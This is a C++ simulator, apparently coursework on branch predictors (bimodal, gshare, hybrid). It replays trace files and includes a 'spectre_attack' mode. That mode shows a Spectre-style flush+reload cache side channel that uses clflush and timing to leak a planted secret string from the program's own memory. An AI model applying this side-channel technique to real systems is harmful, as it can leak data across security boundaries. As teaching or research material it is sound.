#include <iostream>
#include <iomanip>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <x86intrin.h>
#include<fstream>
#include<sstream>
#include<typeinfo>

#include "bimodal_predictor.h"
#include "gshare.h"
#include "hybrid.cpp"

using namespace std;


uint8_t memory[100];
uint8_t* buffer = memory;
char* secret = (char*)&memory[32];
uint8_t arr[256 * 4096];
unsigned int bound_lower = 0;
unsigned int bound_upper = 9;

#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

// BimodalPredictor* predictor;

void flushSideChannel() {
    for (int i = 0; i < 256; i++) {
        arr[i * 4096 + DELTA] = 1;
        _mm_clflush(&arr[i * 4096 + DELTA]);
    }
}

void reloadSideChannel() {
    struct timespec start, end;
    long time_diff;
    volatile uint8_t* addr;

    for (int i = 0; i < 256; i++) {
        addr = &arr[i * 4096 + DELTA];
        clock_gettime(CLOCK_MONOTONIC, &start);
        (void)*addr;
        clock_gettime(CLOCK_MONOTONIC, &end);

        time_diff = (end.tv_sec - start.tv_sec) * 1e9 + (end.tv_nsec - start.tv_nsec);

        if (time_diff <= CACHE_HIT_THRESHOLD) {
            cout << "array[" << i << "*4096 + " << DELTA << "] is in cache.\n";
            cout << "The Secret = " << i << " (" << static_cast<char>(i) << ").\n";
        }
    }
}

template<typename T>
void spectreAttack(size_t index_beyond, T predictor) {
    
    char pc[32];
    for (int i = 0; i < 10; i++) {
        // sprintf(pc, "%lx", (uintptr_t)(static_cast<void (*)(size_t)>(spectreAttack)));
        sprintf(pc, "%lx", reinterpret_cast<uintptr_t>(__builtin_return_address(0)));
        predictor->predict(pc, "t");
        volatile uint8_t temp = buffer[i];
    }

    _mm_clflush(&bound_upper);
    _mm_clflush(&bound_lower);
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&arr[i * 4096 + DELTA]);
    }

    for (volatile int z = 0; z < 100; z++) {}

    // sprintf(pc, "%lx", (uintptr_t)(static_cast<void (*)(size_t)>(spectreAttack)));
    sprintf(pc, "%lx", reinterpret_cast<uintptr_t>(__builtin_return_address(0)));
    predictor->predict(pc, "n");


    if (predictor->getLastPrediction() == "t") {
        uint8_t s = *((uint8_t*)buffer + index_beyond);
        cout << "Accessed secret value (s): " << (int)s << " (" << static_cast<char>(s) << ")\n";
        arr[s * 4096 + DELTA] += 88;
    }
}

int main(int argc, char* argv[]) {
    string branch_pred_type=argv[1];
    bool attack = false;
    for (int i = 0; i < argc; ++i) {
        string word = argv[i];
        if (word == "spectre_attack"){
            attack = true;
        }
    }

    if (branch_pred_type=="bimodal"){
        int m = 6;
        if (argc >= 2) {
            m = atoi(argv[1]);
        }
        BimodalPredictor* predictor;

        if(attack){
        memcpy(secret, "Some Secret Value", strlen("Some Secret Value") + 1);

        predictor = new BimodalPredictor(m);

        cout << "buffer: " << static_cast<void*>(buffer) << "\n";
        cout << "secret: " << static_cast<void*>(secret) << "\n";

        for (int i = 0; i < strlen(secret); i++) {
            ptrdiff_t index_beyond = (secret - (char*)buffer) + i;
            cout << "\n[Leak attempt for byte " << i << "]\n";
            flushSideChannel();
            spectreAttack(static_cast<size_t>(index_beyond),predictor);
            reloadSideChannel();
        }


        predictor->generate_val_traces("sim bimodal " + to_string(m) + " spectre");
        delete predictor;
        }
    }

    else if (branch_pred_type=="gshare"){
        int m = stoi(argv[2]);
        int n = stoi(argv[3]);

        string filename = argv[4];
        string cmd = "sim " + branch_pred_type + " " + argv[2] + " " + argv[3] + " " + filename ;
        
        if(attack){
            cout << "Attacking.." << "\n";
            memcpy(secret, "Some Secret Value", strlen("Some Secret Value") + 1);

            GSharePredictor* predictor;
            predictor = new GSharePredictor(n,m);

            cout << "buffer: " << static_cast<void*>(buffer) << "\n";
            cout << "secret: " << static_cast<void*>(secret) << "\n";

            for (int i = 0; i < strlen(secret); i++) {
                ptrdiff_t index_beyond = (secret - (char*)buffer) + i;
                cout << "\n[Leak attempt for byte " << i << "]\n";
                flushSideChannel();
                spectreAttack(static_cast<size_t>(index_beyond), predictor);
                reloadSideChannel();
            }


            predictor->generate_val_traces("sim gshare " + to_string(n) + " " + to_string(m) + " spectre");
            delete predictor;
        }

        else{
            ifstream traceFile;

            GSharePredictor predictor(n, m);
            string line;
            traceFile.open("../traces/"+filename);
            
            
            if(traceFile.is_open()){
                while (getline(traceFile, line))
                {
                    // predictor.predict();
                    stringstream ss(line);
                    string word;
                    vector<string> address_and_label;

                    while (ss >> word) { // Extract words separated by spaces
                        address_and_label.push_back(word);
                
                    }
                    predictor.predict(address_and_label[0], address_and_label[1]);
                    // cout << address_and_label[0] << " " << address_and_label[1] << "\n";
                }
                traceFile.close();
                predictor.generate_val_traces(cmd);
            }
            else{
                cout << "Unable to open trace file\n";
            }
        }
        
    }

    else if (branch_pred_type=="hybrid"){
        if (argc < 7) {
            cerr << "Usage: sim hybrid <K> <M1> <N> <M2> <tracefile>\n";
            return 1;
        }

        int K  = stoi(argv[2]);
        int M1 = stoi(argv[3]);
        int N  = stoi(argv[4]);
        int M2 = stoi(argv[5]);
        string filename = argv[6];

        // Build a command string to show in output
        string cmd = "./sim " + branch_pred_type + " " +
                     to_string(K) + " " +
                     to_string(M1) + " " +
                     to_string(N) + " " +
                     to_string(M2) + " " + filename;
        
        if(attack){
            cout << "Attacking.." << "\n";
            memcpy(secret, "Some Secret Value", strlen("Some Secret Value") + 1);

            HybridPredictor* predictor;
            predictor = new HybridPredictor(K, M1, N, M2);

            cout << "buffer: " << static_cast<void*>(buffer) << "\n";
            cout << "secret: " << static_cast<void*>(secret) << "\n";

            for (int i = 0; i < strlen(secret); i++) {
                ptrdiff_t index_beyond = (secret - (char*)buffer) + i;
                cout << "\n[Leak attempt for byte " << i << "]\n";
                flushSideChannel();
                spectreAttack(static_cast<size_t>(index_beyond), predictor);
                reloadSideChannel();
            }


            // predictor->generate_val_traces("sim gshare " + to_string(n) + " " + to_string(m) + " spectre");
            delete predictor;
        }

        else{
            ifstream traceFile;

            HybridPredictor predictor(K, M1, N, M2);
            string line;
            traceFile.open("../traces/"+filename);
            
            
            if(traceFile.is_open()){
                while (getline(traceFile, line))
                {
                    // predictor.predict();
                    stringstream ss(line);
                    string word;
                    vector<string> address_and_label;

                    while (ss >> word) { // Extract words separated by spaces
                        address_and_label.push_back(word);
                
                    }
                    predictor.predict(address_and_label[0], address_and_label[1]);
                    // cout << address_and_label[0] << " " << address_and_label[1] << "\n";
                }
                traceFile.close();
                predictor.generate_val_traces(cmd);
            }
            else{
                cout << "Unable to open trace file\n";
            }
        }
        
    }
    
    
    
    return 0;
}
